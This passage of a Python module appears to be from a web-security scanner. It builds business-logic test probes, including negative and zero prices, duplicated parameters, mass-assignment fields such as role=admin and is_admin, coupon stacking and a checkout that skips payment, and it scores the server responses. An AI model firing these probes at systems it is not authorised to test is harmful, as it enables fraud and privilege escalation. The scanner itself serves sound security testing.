"""
Business Logic Flaws & State Machine Security Detection Collector for ARGUS.

Actively validates whether web endpoints and multi-step workflows are vulnerable
to business logic flaws, state machine manipulation, price/quantity parameter
tampering, step-skipping, mass assignment, and coupon/voucher stacking:
1. Price, Quantity & Currency Parameter Tampering:
   - Negative quantities, floating-point precision roundings, zero-amount checkout,
     and currency parameter manipulation.
2. Multi-Step Workflow & State Transition Skips:
   - Skipping intermediate verification/payment steps directly to fulfillment
     endpoints, out-of-order transition submission.
3. Mass Assignment & Insecure Parameter Injection:
   - Injecting privileged fields (is_admin, role, verified, tier, discount_rate)
     during profile update, registration, or role change flows.
4. Coupon / Voucher Stacking & Idempotency Abuse:
   - Replaying discount codes across cart items, coupon stacking anomalies,
     and negative total cost generation.
5. Differential Business Rule Verification Pipeline:
   - Automated invariant baselining, stateful mutation execution, and post-state
     assertion to confirm financial or authorization invariant violations.
6. False Positive Rejection:
   - Properly secured and validated endpoints (returning 400/401/403/404/409/422
     or clean server-side rejection error messages) MUST NOT generate evidence.

Provides 5+ distinct mutation and sequence manipulation strategies:
1. BOUNDARY_NEGATIVE_INJECTION: Negative values (-1, -50.00), zero boundaries,
   extreme integers (99999999), and float precision roundings.
2. TYPE_JUGGLING_SCHEMA_TAMPERING: Array wrapping ({"price": [0]}), boolean types
   ({"role": true}), string numbers ({"quantity": "0"}), and schema subversion.
3. OUT_OF_SEQUENCE_DISPATCH: Direct invocation of fulfillment/completion steps
   skipping required payment or verification steps.
4. VERB_CONTENT_TYPE_INVERSION: Inverting HTTP verbs (POST -> PUT/PATCH/GET) and
   content-types (json -> form-urlencoded / xml) or method override headers.
5. PARAMETER_POLLUTION_DUPLICATE: Duplicate query/body keys (price=100&price=0)
   exploiting differences in web framework parameter precedence.

Emits structured Evidence(category="business_logic"), updates mission vulnerabilities,
and expands AttackSurfaceGraph with HAS_ENDPOINT and HAS_VULNERABILITY edges.
"""
from __future__ import annotations

import copy
import json
import logging
import re
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Set, Tuple, Union

from argus.collectors.base import BaseCollector
from argus.collectors.toolkit.enums import Severity
from argus.evidence.model import Evidence, ProvenanceData
from argus.graph.node import Node
from argus.http.client import AuthenticatedHttpClient, HttpResponse

logger = logging.getLogger(__name__)


# ============================================================================
# Enums & Data Models
# ============================================================================

# Canonical severity scale (see argus.collectors.toolkit.enums.Severity).
BusinessLogicSeverity = Severity


# Backwards compatibility alias
Severity = BusinessLogicSeverity


class BusinessLogicTechnique(str, Enum):
    """Enumeration of business logic vulnerability detection techniques."""
    PRICE_TAMPERING = "price_tampering"
    WORKFLOW_STEP_SKIP = "workflow_step_skip"
    MASS_ASSIGNMENT = "mass_assignment"
    COUPON_STACKING = "coupon_stacking"
    DIFFERENTIAL_STATE_VERIFICATION = "differential_state_verification"


# Backwards compatibility aliases
BusinessLogicTechnique.PRICE_QUANTITY_TAMPERING = BusinessLogicTechnique.PRICE_TAMPERING  # type: ignore[attr-defined]
BusinessLogicTechnique.STATE_TRANSITION_SKIP = BusinessLogicTechnique.WORKFLOW_STEP_SKIP  # type: ignore[attr-defined]
BusinessLogicTechnique.DIFFERENTIAL_STATE_VIOLATION = BusinessLogicTechnique.DIFFERENTIAL_STATE_VERIFICATION  # type: ignore[attr-defined]


class BusinessLogicMutationStrategy(str, Enum):
    """Enumeration of business logic mutation and sequence manipulation strategies."""
    BOUNDARY_NEGATIVE_INJECTION = "boundary_negative_injection"
    TYPE_JUGGLING_SCHEMA_TAMPERING = "type_juggling_schema_tampering"
    OUT_OF_SEQUENCE_DISPATCH = "out_of_sequence_dispatch"
    VERB_CONTENT_TYPE_INVERSION = "verb_content_type_inversion"
    PARAMETER_POLLUTION_DUPLICATE = "parameter_pollution_duplicate"


# Backwards compatibility aliases
BusinessLogicMutationStrategy.NEGATIVE_BOUNDARY_VALUE = BusinessLogicMutationStrategy.BOUNDARY_NEGATIVE_INJECTION  # type: ignore[attr-defined]
BusinessLogicMutationStrategy.TYPE_JUGGLING_SCHEMA = BusinessLogicMutationStrategy.TYPE_JUGGLING_SCHEMA_TAMPERING  # type: ignore[attr-defined]
BusinessLogicMutationStrategy.HTTP_VERB_CONTENT_TYPE = BusinessLogicMutationStrategy.VERB_CONTENT_TYPE_INVERSION  # type: ignore[attr-defined]
BusinessLogicMutationStrategy.PARAMETER_POLLUTION = BusinessLogicMutationStrategy.PARAMETER_POLLUTION_DUPLICATE  # type: ignore[attr-defined]


@dataclass
class WorkflowStep:
    """Represents a single step in a multi-step business workflow."""
    name: str
    url: str
    method: str = "POST"
    headers: Dict[str, str] = field(default_factory=dict)
    json_data: Optional[Any] = None
    data: Optional[Any] = None
    params: Optional[Dict[str, Any]] = None
    extract_fields: Dict[str, str] = field(default_factory=dict)
    required_state: Dict[str, str] = field(default_factory=dict)
    expected_status: int = 200


@dataclass
class WorkflowSequence:
    """Represents a multi-step workflow sequence for state transition probing."""
    name: str
    steps: List[WorkflowStep] = field(default_factory=list)
    target_step_index: int = 0
    skip_step_indices: List[int] = field(default_factory=list)
    state_baseline: Dict[str, Any] = field(default_factory=dict)
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class BusinessLogicProbeResponse:
    """Represents an HTTP response captured during business logic probing."""
    step_name: str = ""
    status_code: int = 0
    headers: Dict[str, str] = field(default_factory=dict)
    body: str = ""
    json_data: Optional[Any] = None
    elapsed: float = 0.0
    error: Optional[str] = None
    endpoint_url: str = ""
    raw_response: Optional[Any] = None


@dataclass
class BusinessLogicProbe:
    """Represents a single discrete business logic probe."""
    name: str
    endpoint_url: str
    method: str = "POST"
    headers: Dict[str, str] = field(default_factory=dict)
    json_data: Optional[Any] = None
    data: Optional[Any] = None
    params: Optional[Dict[str, Any]] = None
    technique: Union[BusinessLogicTechnique, str] = BusinessLogicTechnique.PRICE_TAMPERING
    mutation_strategy: Union[BusinessLogicMutationStrategy, str] = BusinessLogicMutationStrategy.BOUNDARY_NEGATIVE_INJECTION
    expected_status: int = 200
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class BusinessLogicResult:
    """Represents the outcome of a business logic validation probe."""
    technique: str
    strategy: str = ""
    severity: str = "high"
    confidence: float = 0.95
    payload: Any = None
    matched_signature: str = ""
    evidence_snippet: str = ""
    endpoint_url: str = ""
    parameter: Optional[str] = None
    parameter_type: str = "business_logic_param"
    status_code: int = 200
    is_valid_finding: bool = True
    error_message: Optional[str] = None
    template_id: str = "business-logic"
    vulnerability_type: Optional[str] = None
    cwe_id: str = "CWE-840"
    cvss_score: float = 8.5
    pre_state: Any = None
    post_state: Any = None
    state_delta: Any = None
    workflow_trace: List[str] = field(default_factory=list)
    mutation_strategy: Optional[str] = None
    metadata: Dict[str, Any] = field(default_factory=dict)

    def __post_init__(self):
        if not self.strategy and self.mutation_strategy:
            self.strategy = self.mutation_strategy
        elif not self.mutation_strategy and self.strategy:
            self.mutation_strategy = self.strategy
        elif not self.strategy and not self.mutation_strategy:
            self.strategy = BusinessLogicMutationStrategy.BOUNDARY_NEGATIVE_INJECTION.value
            self.mutation_strategy = self.strategy

        if not self.vulnerability_type:
            self.vulnerability_type = self.technique
        if not self.metadata:
            self.metadata = {
                "technique": self.technique,
                "strategy": self.strategy,
                "mutation_strategy": self.mutation_strategy,
                "matched_signature": self.matched_signature,
                "url": self.endpoint_url,
                "parameter": self.parameter,
                "cwe_id": self.cwe_id,
                "cvss_score": self.cvss_score,
            }


# ============================================================================
# Payload Generator
# ============================================================================

class BusinessLogicPayloadGenerator:
    """
    Generates structured test payloads across all 5 mutation strategies and
    5 business logic vulnerability variants.
    """

    @classmethod
    def build_price_tampering_payloads(
        cls,
        endpoint_url: str,
        base_payload: Optional[Dict[str, Any]] = None,
        param_names: Optional[List[str]] = None,
    ) -> List[BusinessLogicProbe]:
        """
        Generates price, quantity, and currency tampering payloads covering
        negative numbers, zero boundaries, float roundings, and currency switches.
        """
        probes: List[BusinessLogicProbe] = []
        base = copy.deepcopy(base_payload) if base_payload else {"item_id": 101, "price": 100.0, "quantity": 1, "currency": "USD"}
        params_to_test = param_names or ["price", "quantity", "amount", "total", "unit_price", "currency"]

        # Negative & Boundary Value Mutations
        boundary_mutations = [
            ("price", -50.00, BusinessLogicMutationStrategy.BOUNDARY_NEGATIVE_INJECTION),
            ("price", -0.01, BusinessLogicMutationStrategy.BOUNDARY_NEGATIVE_INJECTION),
            ("price", 0, BusinessLogicMutationStrategy.BOUNDARY_NEGATIVE_INJECTION),
            ("price", 0.0000001, BusinessLogicMutationStrategy.BOUNDARY_NEGATIVE_INJECTION),
            ("quantity", -1, BusinessLogicMutationStrategy.BOUNDARY_NEGATIVE_INJECTION),
            ("quantity", -10, BusinessLogicMutationStrategy.BOUNDARY_NEGATIVE_INJECTION),
            ("quantity", 0, BusinessLogicMutationStrategy.BOUNDARY_NEGATIVE_INJECTION),
            ("quantity", 999999999, BusinessLogicMutationStrategy.BOUNDARY_NEGATIVE_INJECTION),
            ("amount", -100.0, BusinessLogicMutationStrategy.BOUNDARY_NEGATIVE_INJECTION),
            ("amount", 0.0, BusinessLogicMutationStrategy.BOUNDARY_NEGATIVE_INJECTION),
            ("currency", "JPY", BusinessLogicMutationStrategy.BOUNDARY_NEGATIVE_INJECTION),
            ("currency", "XXX", BusinessLogicMutationStrategy.BOUNDARY_NEGATIVE_INJECTION),
        ]

        for p_name, val, strat in boundary_mutations:
            if p_name in params_to_test or any(k in base for k in (p_name,)):
                payload = copy.deepcopy(base)
                payload[p_name] = val
                probes.append(
                    BusinessLogicProbe(
                        name=f"price_tamper_{p_name}_{val}",
                        endpoint_url=endpoint_url,
                        method="POST",
                        headers={"Content-Type": "application/json"},
                        json_data=payload,
                        technique=BusinessLogicTechnique.PRICE_TAMPERING,
                        mutation_strategy=strat,
                        metadata={"parameter": p_name, "tampered_value": val},
                    )
                )

        # Type Juggling & Schema Mutations
        type_juggling_mutations = [
            ("price", [0], BusinessLogicMutationStrategy.TYPE_JUGGLING_SCHEMA_TAMPERING),
            ("price", "0", BusinessLogicMutationStrategy.TYPE_JUGGLING_SCHEMA_TAMPERING),
            ("price", False, BusinessLogicMutationStrategy.TYPE_JUGGLING_SCHEMA_TAMPERING),
            ("quantity", "0", BusinessLogicMutationStrategy.TYPE_JUGGLING_SCHEMA_TAMPERING),
            ("quantity", [1, -1], BusinessLogicMutationStrategy.TYPE_JUGGLING_SCHEMA_TAMPERING),
        ]

        for p_name, val, strat in type_juggling_mutations:
            payload = copy.deepcopy(base)
            payload[p_name] = val
            probes.append(
                BusinessLogicProbe(
                    name=f"type_juggling_{p_name}_{type(val).__name__}",
                    endpoint_url=endpoint_url,
                    method="POST",
                    headers={"Content-Type": "application/json"},
                    json_data=payload,
                    technique=BusinessLogicTechnique.PRICE_TAMPERING,
                    mutation_strategy=strat,
                    metadata={"parameter": p_name, "tampered_value": str(val)},
                )
            )

        # Parameter Pollution & Duplicate Key Query / Form Payloads
        polluted_queries = [
            "price=100&price=0",
            "quantity=1&quantity=-1",
            "amount=50&amount=0.01",
            "price=100&price=-50",
        ]
        for query_str in polluted_queries:
            p_key = query_str.split("=")[0]
            probes.append(
                BusinessLogicProbe(
                    name=f"param_pollution_{query_str}",
                    endpoint_url=f"{endpoint_url}?{query_str}" if "?" not in endpoint_url else f"{endpoint_url}&{query_str}",
                    method="POST",
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    data=query_str,
                    technique=BusinessLogicTechnique.PRICE_TAMPERING,
                    mutation_strategy=BusinessLogicMutationStrategy.PARAMETER_POLLUTION_DUPLICATE,
                    metadata={"parameter": p_key, "query": query_str},
                )
            )

        return probes

    @classmethod
    def build_mass_assignment_payloads(
        cls,
        endpoint_url: str,
        base_payload: Optional[Dict[str, Any]] = None,
    ) -> List[BusinessLogicProbe]:
        """
        Generates mass assignment payloads attempting to inject administrative
        privileges, elevated roles, verification flags, tiers, or discount rates.
        """
        base = copy.deepcopy(base_payload) if base_payload else {"name": "Test User", "email": "test@example.com"}
        probes: List[BusinessLogicProbe] = []

        privileged_injections = [
            ("is_admin", True),
            ("role", "admin"),
            ("role", "administrator"),
            ("role_id", 1),
            ("admin", True),
            ("is_superuser", True),
            ("verified", True),
            ("is_verified", True),
            ("tier", "enterprise"),
            ("tier", "vip"),
            ("account_type", "premium"),
            ("discount_rate", 0.99),
            ("balance", 999999),
            ("permissions", ["*"]),
        ]

        # 1. Individual Field Injections
        for field_name, value in privileged_injections:
            payload = copy.deepcopy(base)
            payload[field_name] = value
            probes.append(
                BusinessLogicProbe(
                    name=f"mass_assignment_{field_name}",
                    endpoint_url=endpoint_url,
                    method="PUT",
                    headers={"Content-Type": "application/json"},
                    json_data=payload,
                    technique=BusinessLogicTechnique.MASS_ASSIGNMENT,
                    mutation_strategy=BusinessLogicMutationStrategy.BOUNDARY_NEGATIVE_INJECTION,
                    metadata={"injected_field": field_name, "injected_value": value},
                )
            )

        # 2. Type Juggling Schema Mutations (e.g. role as boolean or list)
        juggling_injections = [
            ("role", True),
            ("is_admin", "true"),
            ("is_admin", 1),
            ("role", ["admin"]),
            ("permissions", "admin"),
        ]
        for field_name, value in juggling_injections:
            payload = copy.deepcopy(base)
            payload[field_name] = value
            probes.append(
                BusinessLogicProbe(
                    name=f"mass_assignment_juggling_{field_name}",
                    endpoint_url=endpoint_url,
                    method="PATCH",
                    headers={"Content-Type": "application/json"},
                    json_data=payload,
                    technique=BusinessLogicTechnique.MASS_ASSIGNMENT,
                    mutation_strategy=BusinessLogicMutationStrategy.TYPE_JUGGLING_SCHEMA_TAMPERING,
                    metadata={"injected_field": field_name, "injected_value": value},
                )
            )

        # 3. Parameter Pollution Duplicate Keys in Query/Form Data
        for field_name, value in [("role", "admin"), ("is_admin", "true"), ("tier", "enterprise")]:
            query_str = f"name=TestUser&{field_name}=user&{field_name}={value}"
            probes.append(
                BusinessLogicProbe(
                    name=f"mass_assignment_pollution_{field_name}",
                    endpoint_url=f"{endpoint_url}?{query_str}" if "?" not in endpoint_url else f"{endpoint_url}&{query_str}",
                    method="POST",
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    data=query_str,
                    technique=BusinessLogicTechnique.MASS_ASSIGNMENT,
                    mutation_strategy=BusinessLogicMutationStrategy.PARAMETER_POLLUTION_DUPLICATE,
                    metadata={"injected_field": field_name, "injected_value": value},
                )
            )

        # 4. Verb and Content-Type Inversions
        verb_mutations = ["POST", "PUT", "PATCH"]
        for verb in verb_mutations:
            payload = copy.deepcopy(base)
            payload["role"] = "admin"
            payload["is_admin"] = True
            probes.append(
                BusinessLogicProbe(
                    name=f"mass_assignment_verb_{verb}",
                    endpoint_url=endpoint_url,
                    method=verb,
                    headers={
                        "Content-Type": "application/json",
                        "X-HTTP-Method-Override": "PUT",
                    },
                    json_data=payload,
                    technique=BusinessLogicTechnique.MASS_ASSIGNMENT,
                    mutation_strategy=BusinessLogicMutationStrategy.VERB_CONTENT_TYPE_INVERSION,
                    metadata={"verb": verb, "injected_field": "role", "injected_value": "admin"},
                )
            )

        return probes

    @classmethod
    def build_coupon_stacking_payloads(
        cls,
        endpoint_url: str,
        coupon_codes: Optional[List[str]] = None,
        cart_id: Optional[str] = None,
    ) -> List[BusinessLogicProbe]:
        """
        Generates coupon and voucher stacking payloads attempting to apply
        single-use coupons repeatedly, combine non-stackable discounts, or
        achieve negative cart totals.
        """
        codes = coupon_codes or ["SAVE20", "DISCOUNT50", "WELCOME10", "PROMO100"]
        c_id = cart_id or "cart_default"
        probes: List[BusinessLogicProbe] = []

        # 1. Array Stacking in JSON
        array_payload = {"cart_id": c_id, "coupon_codes": [codes[0], codes[0], codes[0]]}
        probes.append(
            BusinessLogicProbe(
                name="coupon_array_duplicate_stacking",
                endpoint_url=endpoint_url,
                method="POST",
                headers={"Content-Type": "application/json"},
                json_data=array_payload,
                technique=BusinessLogicTechnique.COUPON_STACKING,
                mutation_strategy=BusinessLogicMutationStrategy.BOUNDARY_NEGATIVE_INJECTION,
                metadata={"coupons": array_payload["coupon_codes"]},
            )
        )

        multi_array_payload = {"cart_id": c_id, "coupon_codes": codes[:3]}
        probes.append(
            BusinessLogicProbe(
                name="coupon_array_multi_stacking",
                endpoint_url=endpoint_url,
                method="POST",
                headers={"Content-Type": "application/json"},
                json_data=multi_array_payload,
                technique=BusinessLogicTechnique.COUPON_STACKING,
                mutation_strategy=BusinessLogicMutationStrategy.BOUNDARY_NEGATIVE_INJECTION,
                metadata={"coupons": multi_array_payload["coupon_codes"]},
            )
        )

        # 2. Type Juggling Schema Mutations (e.g. coupon as boolean True or negative discount)
        juggling_payloads = [
            {"cart_id": c_id, "coupon_code": True},
            {"cart_id": c_id, "coupon_code": [codes[0]]},
            {"cart_id": c_id, "discount": -50.0},
            {"cart_id": c_id, "discount_rate": 1.5},
        ]
        for idx, j_payload in enumerate(juggling_payloads):
            probes.append(
                BusinessLogicProbe(
                    name=f"coupon_juggling_{idx}",
                    endpoint_url=endpoint_url,
                    method="POST",
                    headers={"Content-Type": "application/json"},
                    json_data=j_payload,
                    technique=BusinessLogicTechnique.COUPON_STACKING,
                    mutation_strategy=BusinessLogicMutationStrategy.TYPE_JUGGLING_SCHEMA_TAMPERING,
                    metadata={"payload": j_payload},
                )
            )

        # 3. Parameter Pollution Duplicate Coupon Keys
        polluted_coupon_query = f"cart_id={c_id}&coupon={codes[0]}&coupon={codes[0]}&coupon={codes[1] if len(codes) > 1 else codes[0]}"
        probes.append(
            BusinessLogicProbe(
                name="coupon_param_pollution",
                endpoint_url=f"{endpoint_url}?{polluted_coupon_query}" if "?" not in endpoint_url else f"{endpoint_url}&{polluted_coupon_query}",
                method="POST",
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                data=polluted_coupon_query,
                technique=BusinessLogicTechnique.COUPON_STACKING,
                mutation_strategy=BusinessLogicMutationStrategy.PARAMETER_POLLUTION_DUPLICATE,
                metadata={"query": polluted_coupon_query},
            )
        )

        return probes

    @classmethod
    def build_workflow_skip_sequence(
        cls,
        base_url: str,
        custom_steps: Optional[List[WorkflowStep]] = None,
    ) -> WorkflowSequence:
        """
        Constructs an e-commerce / state machine workflow sequence designed to test
        skipping intermediate payment / verification steps.
        """
        root = base_url.rstrip("/")
        if custom_steps:
            steps = custom_steps
        else:
            steps = [
                WorkflowStep(
                    name="cart_create",
                    url=f"{root}/api/cart",
                    method="POST",
                    json_data={"items": [{"id": "item_1", "quantity": 1}]},
                    extract_fields={"cart_id": "cart_id", "order_id": "id"},
                ),
                WorkflowStep(
                    name="shipping_address",
                    url=f"{root}/api/checkout/shipping",
                    method="POST",
                    json_data={"cart_id": "{cart_id}", "address": "123 Security Blvd"},
                    required_state={"cart_id": "{cart_id}"},
                ),
                WorkflowStep(
                    name="payment_step",
                    url=f"{root}/api/checkout/pay",
                    method="POST",
                    json_data={"cart_id": "{cart_id}", "amount": 100.0, "payment_token": "tok_valid"},
                    extract_fields={"payment_id": "payment_id", "step_token": "token"},
                    required_state={"cart_id": "{cart_id}"},
                ),
                WorkflowStep(
                    name="order_fulfillment",
                    url=f"{root}/api/checkout/fulfill",
                    method="POST",
                    json_data={"cart_id": "{cart_id}", "order_id": "{order_id}"},
                    required_state={"cart_id": "{cart_id}"},
                ),
            ]

        return WorkflowSequence(
            name="checkout_workflow_skip_payment",
            steps=steps,
            target_step_index=len(steps) - 1,
            skip_step_indices=[2],  # Skip payment step (index 2)
            metadata={"description": "Attempting fulfillment directly after cart creation skipping payment"},
        )

    @classmethod
    def build_verb_content_type_inversions(
        cls,
        endpoint_url: str,
        method: str = "POST",
        json_data: Optional[Dict[str, Any]] = None,
    ) -> List[BusinessLogicProbe]:
        """
        Generates verb and content-type inversion probes.
        """
        probes: List[BusinessLogicProbe] = []
        payload = json_data or {"action": "confirm", "verified": True}
        verbs = ["GET", "PUT", "PATCH", "DELETE", "OPTIONS"]

        for v in verbs:
            if v != method:
                probes.append(
                    BusinessLogicProbe(
                        name=f"verb_inversion_{v}",
                        endpoint_url=endpoint_url,
                        method=v,
                        headers={"Content-Type": "application/json", "X-HTTP-Method-Override": method},
                        json_data=payload if v in ("POST", "PUT", "PATCH") else None,
                        params=payload if v == "GET" else None,
                        technique=BusinessLogicTechnique.DIFFERENTIAL_STATE_VERIFICATION,
                        mutation_strategy=BusinessLogicMutationStrategy.VERB_CONTENT_TYPE_INVERSION,
                        metadata={"inversion_verb": v},
                    )
                )

        # Content-Type Inversion
        probes.append(
            BusinessLogicProbe(
                name="content_type_urlencoded_inversion",
                endpoint_url=endpoint_url,
                method=method,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                data=urllib.parse.urlencode(payload),
                technique=BusinessLogicTechnique.DIFFERENTIAL_STATE_VERIFICATION,
                mutation_strategy=BusinessLogicMutationStrategy.VERB_CONTENT_TYPE_INVERSION,
                metadata={"inversion_content_type": "application/x-www-form-urlencoded"},
            )
        )

        return probes


# ============================================================================
# Security Analyzer
# ============================================================================

class BusinessLogicSecurityAnalyzer:
    """
    Pure / deterministic security analyzer evaluating HTTP responses, JSON states,
    and business rule invariants against business logic flaw signatures.
    Strictly suppresses false positives against hardened endpoints.
    """

    # Signatures indicating explicit server-side defense rejection
    HARDENED_ERROR_PATTERNS = [
        re.compile(r"invalid\s+(price|quantity|amount|total|currency)", re.IGNORECASE),
        re.compile(r"(quantity|price|amount)\s+must\s+be\s+(positive|greater\s+than\s+0|valid)", re.IGNORECASE),
        re.compile(r"(negative|zero)\s+(price|quantity|amount|total)\s+(not\s+allowed|invalid|rejected)", re.IGNORECASE),
        re.compile(r"(unauthorized|forbidden|not\s+allowed|permission\s+denied)", re.IGNORECASE),
        re.compile(r"(coupon|voucher|promo)\s+(already\s+used|invalid|expired|not\s+combinable|already\s+applied)", re.IGNORECASE),
        re.compile(r"(cannot\s+combine|single\s+use|max\s+discount\s+exceeded)", re.IGNORECASE),
        re.compile(r"(step\s+missing|invalid\s+step|out\s+of\s+sequence|payment\s+required|unpaid)", re.IGNORECASE),
        re.compile(r"(order\s+not\s+found|cart\s+empty|state\s+mismatch|transition\s+invalid)", re.IGNORECASE),
        re.compile(r"(schema\s+validation|validation\s+error|field\s+disallowed|unknown\s+field)", re.IGNORECASE),
        re.compile(r"(missing\s+required\s+token|csrf\s+token\s+invalid|bad\s+request)", re.IGNORECASE),
    ]

    @classmethod
    def is_hardened_defense(cls, status_code: int, body: str) -> bool:
        """
        Determines if the server response represents an explicit security or
        validation rejection (e.g. 400 Bad Request, 403 Forbidden, 409 Conflict,
        422 Unprocessable Entity, or standard server-side validation error message).
        """
        if status_code in (400, 401, 403, 404, 405, 409, 422, 423, 429):
            return True

        if not body:
            return False

        for pattern in cls.HARDENED_ERROR_PATTERNS:
            if pattern.search(body):
                return True

        return False

    @classmethod
    def analyze_price_tampering(
        cls,
        endpoint_url: str,
        probe: BusinessLogicProbe,
        response: BusinessLogicProbeResponse,
        pre_state: Any = None,
        post_state: Any = None,
    ) -> Optional[BusinessLogicResult]:
        """
        Analyzes responses for price, quantity, currency tampering or zero-amount checkout.
        """
        if cls.is_hardened_defense(response.status_code, response.body):
            return None

        # Must have accepted request (200, 201, 204)
        if response.status_code not in (200, 201, 204):
            return None

        body_str = response.body
        json_obj = response.json_data if isinstance(response.json_data, dict) else {}
        tampered_param = probe.metadata.get("parameter", "price")
        tampered_val = probe.metadata.get("tampered_value", None)

        # Extract numeric total and item price from response if present
        resp_total = None
        for key in ("total", "cart_total", "amount", "order_total", "balance", "total_price", "grand_total"):
            if key in json_obj and isinstance(json_obj[key], (int, float)) and not isinstance(json_obj[key], bool):
                resp_total = json_obj[key]
                break

        resp_item_price = None
        for key in (tampered_param, "unit_price", "item_price", "price"):
            if key in json_obj and isinstance(json_obj[key], (int, float)) and not isinstance(json_obj[key], bool):
                resp_item_price = json_obj[key]
                break

        if resp_item_price is None and isinstance(json_obj.get("items"), list) and json_obj["items"]:
            first_item = json_obj["items"][0]
            if isinstance(first_item, dict):
                for key in (tampered_param, "unit_price", "item_price", "price"):
                    if key in first_item and isinstance(first_item[key], (int, float)) and not isinstance(first_item[key], bool):
                        resp_item_price = first_item[key]
                        break

        # Check for success indicators
        is_success = False
        evidence_snippet = ""
        matched_sig = ""

        # Negative price/amount accepted
        if tampered_val is not None and isinstance(tampered_val, (int, float)) and tampered_val < 0:
            if resp_total is not None and resp_total <= 0:
                is_success = True
                matched_sig = f"negative_{tampered_param}_accepted"
                evidence_snippet = f"Server accepted negative {tampered_param}={tampered_val} resulting in total={resp_total} (HTTP {response.status_code}): {body_str[:150]}"
            elif resp_item_price is not None and (resp_item_price == tampered_val or resp_item_price < 0):
                is_success = True
                matched_sig = f"negative_{tampered_param}_accepted"
                evidence_snippet = f"Server accepted negative {tampered_param}={tampered_val} in item price={resp_item_price} (HTTP {response.status_code}): {body_str[:150]}"
            elif resp_total is None and resp_item_price is None:
                if f"-{abs(tampered_val)}" in body_str or f"-${abs(tampered_val)}" in body_str:
                    is_success = True
                    matched_sig = f"negative_{tampered_param}_accepted"
                    evidence_snippet = f"Server accepted negative {tampered_param}={tampered_val} (HTTP {response.status_code}): {body_str[:150]}"

        # Zero amount checkout accepted
        elif tampered_val == 0 or tampered_val == 0.0 or tampered_val == "0":
            if resp_total is not None:
                if resp_total <= 0:
                    is_success = True
                    matched_sig = f"zero_amount_{tampered_param}_checkout"
                    evidence_snippet = f"Server processed zero-amount checkout with total={resp_total} (HTTP {response.status_code}): {body_str[:150]}"
            elif resp_item_price is not None and resp_item_price == 0:
                is_success = True
                matched_sig = f"zero_amount_{tampered_param}_checkout"
                evidence_snippet = f"Server processed zero-amount checkout with item price=0 (HTTP {response.status_code}): {body_str[:150]}"
            elif resp_total is None and resp_item_price is None:
                if "zero-amount" in body_str.lower() or "free order" in body_str.lower() or "$0.00" in body_str:
                    is_success = True
                    matched_sig = f"zero_amount_{tampered_param}_checkout"
                    evidence_snippet = f"Server processed zero-amount checkout with {tampered_param}=0 (HTTP {response.status_code}): {body_str[:150]}"

        # Type juggling schema tampering (e.g. price=[0] or string 0) accepted
        elif probe.mutation_strategy == BusinessLogicMutationStrategy.TYPE_JUGGLING_SCHEMA_TAMPERING:
            if resp_total is not None and resp_total <= 0:
                is_success = True
                matched_sig = f"type_juggling_{tampered_param}_accepted"
                evidence_snippet = f"Server accepted type-juggled {tampered_param}={tampered_val} resulting in total={resp_total} (HTTP {response.status_code}): {body_str[:150]}"
            elif resp_item_price is not None and resp_item_price <= 0:
                is_success = True
                matched_sig = f"type_juggling_{tampered_param}_accepted"
                evidence_snippet = f"Server accepted type-juggled {tampered_param}={tampered_val} (HTTP {response.status_code}): {body_str[:150]}"

        # Parameter pollution accepted
        elif probe.mutation_strategy == BusinessLogicMutationStrategy.PARAMETER_POLLUTION_DUPLICATE:
            if resp_total is not None and resp_total <= 0:
                is_success = True
                matched_sig = "parameter_pollution_duplicate_precedence"
                evidence_snippet = f"Server processed parameter pollution request resulting in total={resp_total} (HTTP {response.status_code}): {body_str[:150]}"
            elif tampered_val is not None and isinstance(tampered_val, (int, float)) and resp_total == tampered_val:
                is_success = True
                matched_sig = "parameter_pollution_duplicate_precedence"
                evidence_snippet = f"Server accepted polluted parameter value {tampered_val} in total (HTTP {response.status_code}): {body_str[:150]}"

        if is_success:
            severity = BusinessLogicSeverity.CRITICAL.value if (tampered_val is not None and isinstance(tampered_val, (int, float)) and tampered_val <= 0) else BusinessLogicSeverity.HIGH.value
            cvss_score = 9.8 if severity == BusinessLogicSeverity.CRITICAL.value else 8.6
            return BusinessLogicResult(
                technique=BusinessLogicTechnique.PRICE_TAMPERING.value,
                strategy=str(probe.mutation_strategy),
                severity=severity,
                confidence=0.98,
                payload=probe.json_data or probe.data or probe.params,
                matched_signature=matched_sig,
                evidence_snippet=evidence_snippet,
                endpoint_url=endpoint_url,
                parameter=tampered_param,
                status_code=response.status_code,
                cwe_id="CWE-602",
                cvss_score=cvss_score,
                pre_state=pre_state,
                post_state=post_state,
            )

        return None

    @classmethod
    def analyze_workflow_step_skip(
        cls,
        endpoint_url: str,
        sequence: WorkflowSequence,
        responses: List[BusinessLogicProbeResponse],
        target_step_name: Optional[str] = None,
    ) -> Optional[BusinessLogicResult]:
        """
        Analyzes responses from an out-of-sequence or step-skipping workflow.
        Detects if final fulfillment or verification was reached without intermediate steps.
        """
        if not responses:
            return None

        final_response = responses[-1]
        if cls.is_hardened_defense(final_response.status_code, final_response.body):
            return None

        # Final step must succeed (200, 201)
        if final_response.status_code not in (200, 201, 204):
            return None

        json_obj = final_response.json_data if isinstance(final_response.json_data, dict) else {}
        body_str = final_response.body

        # Check for unfulfilled / pending / awaiting payment statuses
        status_val = str(json_obj.get("status", "")).lower()
        if status_val in ("pending", "payment_required", "unpaid", "incomplete", "failed", "requires_payment", "awaiting_payment", "rejected", "blocked", "requires_action"):
            return None

        payment_status = str(json_obj.get("payment_status", "")).lower()
        if payment_status in ("pending", "unpaid", "failed", "requires_payment", "awaiting_payment", "requires_action"):
            return None

        # Check body text for explicit pending payment / incomplete workflow indicators
        lower_body = body_str.lower()
        if any(neg in lower_body for neg in ("awaiting payment", "payment required", "payment pending", "cannot fulfill", "unpaid", "step verification failed", "missing step token")):
            return None

        is_success = False
        if (
            status_val in ("success", "completed", "fulfilled", "confirmed")
            or json_obj.get("success") is True
            or json_obj.get("fulfilled") is True
            or "fulfillment_id" in json_obj
            or "tracking_number" in json_obj
            or ("order_id" in json_obj and status_val not in ("pending", "payment_required", "unpaid", "incomplete"))
            or "order fulfilled" in lower_body
            or "order placed" in lower_body
            or "fulfillment confirmed" in lower_body
        ):
            is_success = True

        if is_success:
            trace = [f"{r.step_name}:{r.status_code}" for r in responses]
